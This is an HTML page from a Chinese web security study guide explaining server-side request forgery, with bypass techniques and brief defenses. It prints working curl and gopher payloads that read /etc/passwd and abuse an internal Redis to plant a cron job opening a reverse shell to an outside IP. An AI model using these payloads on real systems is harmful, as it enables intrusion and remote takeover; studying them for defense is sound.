@@ -1,0 +1,408 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>4.4. SSRF &mdash; Web安全学习笔记 1.0 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+  <script type="text/javascript" src="../_static/js/modernizr.min.js"></script>
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/language_data.js"></script>
+    
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+
+    
+
+  
+  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="4.5. 命令注入" href="cmdinjection.html" />
+    <link rel="prev" title="4.3. CSRF" href="csrf.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> Web安全学习笔记
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">内容索引:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../basic/index.html">1. 序章</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../network/index.html">2. 计算机网络与协议</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../info/index.html">3. 信息收集</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="index.html">4. 常见漏洞攻防</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="sql/index.html">4.1. SQL注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xss/index.html">4.2. XSS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="csrf.html">4.3. CSRF</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">4.4. SSRF</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id1">4.4.1. 简介</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id2">4.4.2. 漏洞危害</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id3">4.4.3. 利用方式</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id4">4.4.4. 相关危险函数</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id5">4.4.5. 过滤绕过</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#ip">4.4.5.1. 更改IP地址写法</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id6">4.4.5.2. 使用解析到内网的域名</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#url">4.4.5.3. 利用解析URL所出现的问题</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id7">4.4.5.4. 利用跳转</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#http">4.4.5.5. 通过各种非HTTP协议</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#dns-rebinding">4.4.5.6. DNS Rebinding</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#ipv6">4.4.5.7. 利用IPv6</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#idn">4.4.5.8. 利用IDN</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id8">4.4.6. 可能的利用点</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id9">4.4.7. 防御方式</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id10">4.4.8. 参考链接</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="cmdinjection.html">4.5. 命令注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="pathtraversal.html">4.6. 目录穿越</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileread.html">4.7. 文件读取</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileupload.html">4.8. 文件上传</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileinclude.html">4.9. 文件包含</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xxe.html">4.10. XXE</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ssti.html">4.11. 模版注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xpath.html">4.12. Xpath注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="logic.html">4.13. 逻辑漏洞 / 业务漏洞</a></li>
+<li class="toctree-l2"><a class="reference internal" href="config.html">4.14. 配置安全</a></li>
+<li class="toctree-l2"><a class="reference internal" href="middleware/index.html">4.15. 中间件</a></li>
+<li class="toctree-l2"><a class="reference internal" href="webcache.html">4.16. Web Cache欺骗攻击</a></li>
+<li class="toctree-l2"><a class="reference internal" href="httpSmuggling.html">4.17. HTTP 请求走私</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../language/index.html">5. 语言与框架</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../intranet/index.html">6. 内网渗透</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defense/index.html">7. 防御技术</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../auth/index.html">8. 认证机制</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../tools/index.html">9. 工具与资源</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../manual/index.html">10. 手册速查</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/index.html">11. 其他</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Web安全学习笔记</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="index.html"><span class="section-number">4. </span>常见漏洞攻防</a> &raquo;</li>
+        
+      <li><span class="section-number">4.4. </span>SSRF</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/vuln/ssrf.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="ssrf">
+<h1><span class="section-number">4.4. </span>SSRF<a class="headerlink" href="#ssrf" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="id1">
+<h2><span class="section-number">4.4.1. </span>简介<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h2>
+<p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
+</div>
+<div class="section" id="id2">
+<h2><span class="section-number">4.4.2. </span>漏洞危害<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
+<p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>
+<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
+</div>
+<div class="section" id="id3">
+<h2><span class="section-number">4.4.3. </span>利用方式<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
+<p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p>
+<p>以curl为例, 可以使用dict protocol操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">vvv</span> <span class="s1">&#39;dict://127.0.0.1:6379/info&#39;</span>
+
+<span class="n">curl</span> <span class="o">-</span><span class="n">vvv</span> <span class="s1">&#39;file:///etc/passwd&#39;</span>
+
+<span class="c1"># * 注意: 链接使用单引号，避免$变量问题</span>
+
+<span class="n">curl</span> <span class="o">-</span><span class="n">vvv</span> <span class="s1">&#39;gopher://127.0.0.1:6379/_*1</span><span class="si">%0d</span><span class="s1">%0a$8</span><span class="si">%0d</span><span class="s1">%0aflushall</span><span class="si">%0d</span><span class="s1">%0a*3</span><span class="si">%0d</span><span class="s1">%0a$3</span><span class="si">%0d</span><span class="s1">%0aset</span><span class="si">%0d</span><span class="s1">%0a$1</span><span class="si">%0d</span><span class="s1">%0a1</span><span class="si">%0d</span><span class="s1">%0a$64</span><span class="si">%0d</span><span class="s1">%0a</span><span class="si">%0d</span><span class="s1">%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a</span><span class="si">%0d</span><span class="s1">%0a</span><span class="si">%0d</span><span class="s1">%0a</span><span class="si">%0d</span><span class="s1">%0a*4</span><span class="si">%0d</span><span class="s1">%0a$6</span><span class="si">%0d</span><span class="s1">%0aconfig</span><span class="si">%0d</span><span class="s1">%0a$3</span><span class="si">%0d</span><span class="s1">%0aset</span><span class="si">%0d</span><span class="s1">%0a$3</span><span class="si">%0d</span><span class="s1">%0adir</span><span class="si">%0d</span><span class="s1">%0a$16</span><span class="si">%0d</span><span class="s1">%0a/var/spool/cron/</span><span class="si">%0d</span><span class="s1">%0a*4</span><span class="si">%0d</span><span class="s1">%0a$6</span><span class="si">%0d</span><span class="s1">%0aconfig</span><span class="si">%0d</span><span class="s1">%0a$3</span><span class="si">%0d</span><span class="s1">%0aset</span><span class="si">%0d</span><span class="s1">%0a$10</span><span class="si">%0d</span><span class="s1">%0adbfilename</span><span class="si">%0d</span><span class="s1">%0a$4</span><span class="si">%0d</span><span class="s1">%0aroot</span><span class="si">%0d</span><span class="s1">%0a*1</span><span class="si">%0d</span><span class="s1">%0a$4</span><span class="si">%0d</span><span class="s1">%0asave</span><span class="si">%0d</span><span class="s1">%0aquit</span><span class="si">%0d</span><span class="s1">%0a&#39;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id4">
+<h2><span class="section-number">4.4.4. </span>相关危险函数<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h2>
+<p>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 <code class="docutils literal notranslate"><span class="pre">file_get_contents()</span></code> / <code class="docutils literal notranslate"><span class="pre">fsockopen()</span></code> / <code class="docutils literal notranslate"><span class="pre">curl_exec()</span></code> 等。</p>
+</div>
+<div class="section" id="id5">
+<h2><span class="section-number">4.4.5. </span>过滤绕过<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="ip">
+<h3><span class="section-number">4.4.5.1. </span>更改IP地址写法<a class="headerlink" href="#ip" title="Permalink to this headline">¶</a></h3>
+<p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</span></code></p></li>
+</ul>
+<p>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p>
+<ul class="simple">
+<li><p>8进制格式：0300.0250.0.1</p></li>
+<li><p>16进制格式：0xC0.0xA8.0.1</p></li>
+<li><p>10进制整数格式：3232235521</p></li>
+<li><p>16进制整数格式：0xC0A80001</p></li>
+</ul>
+<p>还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1。</p>
+<p>访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。</p>
+<p>另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。</p>
+</div>
+<div class="section" id="id6">
+<h3><span class="section-number">4.4.5.2. </span>使用解析到内网的域名<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h3>
+<p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。</p>
+<p>另外 <code class="docutils literal notranslate"><span class="pre">xip.io</span></code> 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1。</p>
+</div>
+<div class="section" id="url">
+<h3><span class="section-number">4.4.5.3. </span>利用解析URL所出现的问题<a class="headerlink" href="#url" title="Permalink to this headline">¶</a></h3>
+<p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p>
+<p>比如 <code class="docutils literal notranslate"><span class="pre">http://www.baidu.com&#64;192.168.0.1/</span></code> 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</p>
+</div>
+<div class="section" id="id7">
+<h3><span class="section-number">4.4.5.4. </span>利用跳转<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h3>
+<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p>
+<p>可以使用如 <a class="reference external" href="http://httpbin.org/redirect-to?url=http://192.168.0.1">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p>
+<p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p>
+</div>
+<div class="section" id="http">
+<h3><span class="section-number">4.4.5.5. </span>通过各种非HTTP协议<a class="headerlink" href="#http" title="Permalink to this headline">¶</a></h3>
+<p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p>
+<p>比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
+</pre></div>
+</div>
+<p>除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 <code class="docutils literal notranslate"><span class="pre">file:///path/to/file</span></code> 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过 <code class="docutils literal notranslate"><span class="pre">file:///d:/1.txt</span></code> 来访问D盘中1.txt的内容。</p>
+</div>
+<div class="section" id="dns-rebinding">
+<h3><span class="section-number">4.4.5.6. </span>DNS Rebinding<a class="headerlink" href="#dns-rebinding" title="Permalink to this headline">¶</a></h3>
+<p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
+<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
+<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
+<ul class="simple">
+<li><p>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</p></li>
+<li><p>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</p></li>
+<li><p>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</p></li>
+<li><p>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p></li>
+</ul>
+</div>
+<div class="section" id="ipv6">
+<h3><span class="section-number">4.4.5.7. </span>利用IPv6<a class="headerlink" href="#ipv6" title="Permalink to this headline">¶</a></h3>
+<p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code class="docutils literal notranslate"><span class="pre">[::]</span></code> <code class="docutils literal notranslate"><span class="pre">0000::1</span></code> 或IPv6的内网域名来绕过过滤。</p>
+</div>
+<div class="section" id="idn">
+<h3><span class="section-number">4.4.5.8. </span>利用IDN<a class="headerlink" href="#idn" title="Permalink to this headline">¶</a></h3>
+<p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
+<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code class="docutils literal notranslate"><span class="pre">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</span></code> 和 <code class="docutils literal notranslate"><span class="pre">example.com</span></code> 等同。利用这种方式，可以用 <code class="docutils literal notranslate"><span class="pre">①</span> <span class="pre">②</span> <span class="pre">③</span> <span class="pre">④</span> <span class="pre">⑤</span> <span class="pre">⑥</span> <span class="pre">⑦</span> <span class="pre">⑧</span> <span class="pre">⑨</span> <span class="pre">⑩</span></code> 等字符绕过内网限制。</p>
+</div>
+</div>
+<div class="section" id="id8">
+<h2><span class="section-number">4.4.6. </span>可能的利用点<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>Apache Hadoop远程命令执行</p></li>
+<li><p>axis2-admin部署Server命令执行</p></li>
+<li><p>Confluence SSRF</p></li>
+<li><p>counchdb WEB API远程命令执行</p></li>
+<li><p>dict</p></li>
+<li><p>docker API远程命令执行</p></li>
+<li><p>Elasticsearch引擎Groovy脚本命令执行</p></li>
+<li><p>ftp / ftps（FTP爆破）</p></li>
+<li><p>glassfish任意文件读取和war文件部署间接命令执行</p></li>
+<li><p>gopher</p></li>
+<li><p>HFS远程命令执行</p></li>
+<li><p>http、https</p></li>
+<li><p>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</p></li>
+<li><p>Java调试接口命令执行</p></li>
+<li><p>JBOSS远程Invoker war命令执行</p></li>
+<li><p>Jenkins Scripts接口命令执行</p></li>
+<li><p>ldap</p></li>
+<li><p>mongodb</p></li>
+<li><p>php_fpm/fastcgi 命令执行</p></li>
+<li><p>rtsp - smb/smbs（连接SMB）</p></li>
+<li><p>sftp</p></li>
+<li><p>ShellShock命令执行</p></li>
+<li><p>Struts2 命令执行</p></li>
+<li><p>telnet</p></li>
+<li><p>tftp（UDP协议扩展）</p></li>
+<li><p>tomcat命令执行</p></li>
+<li><p>WebDav PUT上传任意文件</p></li>
+<li><p>WebSphere Admin可部署war间接命令执行</p></li>
+<li><p>zentoPMS远程命令执行</p></li>
+</ul>
+</div>
+<div class="section" id="id9">
+<h2><span class="section-number">4.4.7. </span>防御方式<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>过滤返回的信息</p></li>
+<li><p>统一错误信息</p></li>
+<li><p>限制请求的端口</p></li>
+<li><p>禁止不常用的协议</p></li>
+<li><p>对DNS Rebinding，考虑使用DNS缓存或者Host白名单</p></li>
+</ul>
+</div>
+<div class="section" id="id10">
+<h2><span class="section-number">4.4.8. </span>参考链接<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="http://www.91ri.org/17111.html">SSRF漏洞分析与利用</a></p></li>
+<li><p><a class="reference external" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era Of SSRF</a></p></li>
+<li><p><a class="reference external" href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">php ssrf technique</a></p></li>
+<li><p><a class="reference external" href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">谈一谈如何在Python开发中拒绝SSRF漏洞</a></p></li>
+<li><p><a class="reference external" href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">SSRF Tips</a></p></li>
+<li><p><a class="reference external" href="https://joychou.org/web/phpssrf.html">SSRF in PHP</a></p></li>
+</ul>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="cmdinjection.html" class="btn btn-neutral float-right" title="4.5. 命令注入" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="csrf.html" class="btn btn-neutral float-left" title="4.3. CSRF" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2019, Lyle
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
